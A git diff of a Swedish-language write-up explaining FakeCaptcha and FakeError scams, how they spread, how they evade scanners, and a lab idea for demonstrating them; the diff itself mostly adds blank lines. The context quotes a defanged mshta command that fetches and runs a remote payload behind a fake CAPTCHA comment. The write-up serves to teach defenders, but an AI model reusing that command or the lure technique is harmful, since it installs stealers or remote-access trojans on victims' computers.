@@ -18,9 +18,15 @@ Den Kopieras i smyg utan användarens kunskap.
 
 Som bilden visar nedanför försöker hackarna ge användarna en falsk trygghet genom att visa bara en del av powershell koden som ser ut och vara äkta.
 
+
+
 ![Fakecaptchaps1](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/run_command.jpg)
 
+
+
 Nedanför finns det exempel på hur powershell koden kan se ut.
+
+
 
 ```
 mshta.exe hxxps://ernier[.]shop/lyricalsync[.]mp3 # ''Ι am nοt a rοbοt: САРТСНА Verification UID: 885203
@@ -61,7 +67,11 @@ Fake error är princip samma sak som FakeCaptcha en skillnaden är att den spela
 För att övertyga användaren mer så låser hemsidan sig själv i fullskärm.
 Exempel på FakeError nedanför.
 
+
+
 ![FakeErrorBild](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFgZ371OJLB7x0fK_3a34h710DpAHQLeyLQyaBpp1jhfsFyRD0-tmkLhXAvv0VD1XnU_WK8g5O16VUob1aHIyQf2smhkn6llIaC_H5_6MwogFRD11Hfp-w2kPc9vgiBUTlnftXM7VuCMsFmBPwxtyvAokqOJbgSAndESDU3qZV6-R9SH6meqbyuyoFk8n/s1600-e365/windows.jpg)
+
+
 
 # Initial Access
 En Lista för hackarnas olika sätt att sprida FakeCaptcha / FakeError hemsidorna
@@ -71,16 +81,24 @@ En Lista för hackarnas olika sätt att sprida FakeCaptcha / FakeError hemsidorn
 - Fake tech support / tutorials
 - E-mail
 
+
+
 # Tricks hackarna har använt sig av
 Dom använder även andra metoder för att förhindra att bli påkommna av säkerhets företagen gemom att använda Cloudflare captcha på deras egna illvilliga hemsida, för att sen förhindra web crawlers av säkerhets företagen att hitta deras skadlig kod.
+
+
 
 
 # Konsekvenserna
 Virusen som blir installerad är oftast Stealers eller RAT som sen leder till konto kappning, bedrägeri eller crypto mining
 
+
+
 # Labb ide
 Göra en enkel version av detta med hjälp av attack och defend vm's 
 Öppna calculator på defend vm från attack vm. 
+
+
 
 # Referenser
 ````
